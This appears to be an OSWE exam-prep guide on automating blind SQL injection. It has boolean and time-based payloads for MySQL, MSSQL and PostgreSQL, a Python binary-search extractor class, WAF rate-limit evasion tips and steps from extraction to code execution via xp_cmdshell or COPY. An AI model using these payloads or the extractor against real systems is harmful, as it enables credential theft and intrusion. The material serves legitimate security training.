# Blind SQL Injection Automation

**Goal**: Build reliable, low-request **boolean** and **time-based** extractors for OSWE PoCs (MySQL, MSSQL, PostgreSQL).

**Companions**: `guides/Advanced-SQLi-Techniques.md`, `guides/Postgres-SQLi-to-RCE.md`, `poc-examples/mssql-sqli-xp-cmdshell/`, `poc-examples/manageengine-sqli/`, `poc-examples/second-order-sqli/`.

---

## 1. Blind classes

| Type | Oracle (signal) | Speed | Noise |
|------|-----------------|-------|-------|
| Boolean | True vs false page content/length/status/redirect | Fast | Low if differential clean |
| Time-based | Response latency ≥ threshold | Slow | Network jitter |
| OOB | DNS/HTTP callback from DB | Medium | Needs egress + DB features |
| Error-based | Conditional error thrown | Fast | Needs verbose errors |

OSWE default toolkit: **boolean first**, time as fallback.

---

## 2. Define a clean truth signal

Before coding extractors:

1. Capture true baseline response (body hash, length, status, redirect Location).  
2. Capture false baseline.  
3. Diff them — pick **stable** feature (not CSRF token noise).  
4. Implement `is_true(response) -> bool`.

```python
def is_true(resp) -> bool:
    # examples — pick one stable oracle
    return "Welcome" in resp.text
    # return resp.status_code == 200
    # return len(resp.content) > 1200
```

### Time oracle

```python
def is_true_time(resp, baseline, delay=5.0, skew=1.5) -> bool:
    return resp.elapsed.total_seconds() >= (delay - skew)
```

Calibrate baseline latency (20 samples) on exam network.

---

## 3. Binary search extraction

Extract character at position `i` of expression `expr`:

```text
low, high = 32, 126   # printable ASCII; tighten if needed
while low < high:
    mid = (low + high) // 2
    if ascii(substring(expr, i, 1)) > mid:
        low = mid + 1
    else:
        high = mid
return chr(low)
```

### Request budget

| Approach | ~Requests per char |
|----------|--------------------|
| Binary search ASCII 32–126 | ~7 |
| Linear 32–126 | up to 95 |
| Binary 0–255 | ~8 |

**Always binary search** unless charset known tiny (hex → 4 bits).

### Hex extraction (hashes)

Charset `0-9a-f` → fewer probes; or binary on nibble.

---

## 4. Dialect snippets

### MySQL

```sql
-- boolean
AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)) > 64)

-- time
AND IF(condition, SLEEP(5), 0)
```

### Microsoft SQL Server

```sql
-- boolean
AND (ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)) > 64)

-- time
IF (condition) WAITFOR DELAY '0:0:5'
```

Stacked: `'; WAITFOR DELAY '0:0:5'--`

### PostgreSQL

```sql
AND (ASCII(SUBSTR((SELECT current_user),1,1)) > 64)
SELECT CASE WHEN condition THEN pg_sleep(5) ELSE pg_sleep(0) END
```

---

## 5. Length first

```text
extract length(expr) with binary search 0..N
then extract each position 1..length
```

Prevents endless loops on empty results.

---

## 6. Second-order blind

Payload stored now, executed later (profile, admin view, report job).

PoC pattern:
1. `store(payload)`  
2. `trigger()` page that uses stored value in SQL  
3. `is_true` on trigger response  

See `poc-examples/second-order-sqli/`.

---

## 7. PoC module sketch

```python
class BlindExtractor:
    def __init__(self, session, check_true, build_clause):
        self.session = session
        self.check_true = check_true
        self.build_clause = build_clause  # fn(condition_sql) -> full inject

    def ask(self, condition_sql: str) -> bool:
        resp = self.session.get(..., params=...)
        return self.check_true(resp)

    def extract_char(self, expr: str, pos: int) -> str:
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}"
            if self.ask(cond):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)

    def extract(self, expr: str, length: int | None = None) -> str:
        if length is None:
            length = self.extract_int(f"LENGTH(({expr}))", 0, 64)
        return "".join(self.extract_char(expr, i) for i in range(1, length + 1))
```

Adapt `SUBSTRING`/`SUBSTR`/`ASCII` to dialect.

---

## 8. Performance & reliability

| Issue | Mitigation |
|-------|------------|
| Jitter on time SQLi | Increase delay; more samples; prefer boolean |
| WAF rate limits | Sleep between requests; rotate paths |
| Connection drops | Retries with backoff |
| Unicode | Extract hex encoding of bytes |
| Multibyte | Prefer `HEX()` then decode |

### Parallelism

Possible but dangerous on exam (noise, locks). Prefer sequential reliable.

---

## 9. From data to RCE

Extraction is a **means**:

1. Passwords / tokens → auth  
2. Paths → upload/LFI  
3. Confirm DBA → xp_cmdshell / COPY  
4. Read source from DB filesystem features  

Don’t extract entire DB — extract **what the chain needs**.

---

## 10. OSWE tactics

- Implement extractor **once** per exam language and reuse.  
- Log every condition + true/false for debugging.  
- Proxy off after oracle stable to speed runs.  
- Time box: if boolean unstable after 20 min, switch time-based.  
- Report: describe algorithm + sample request, not 5000 lines of output.  

### Timing targets (practice)

| Task | Cold goal |
|------|-----------|
| Boolean oracle function | 10 min |
| 8-char extract | depends network; code ready &lt;15 min |
| Dialect switch MySQL→PG | 10 min |

**Related**: Speed-Drills D2, Advanced SQLi guide.
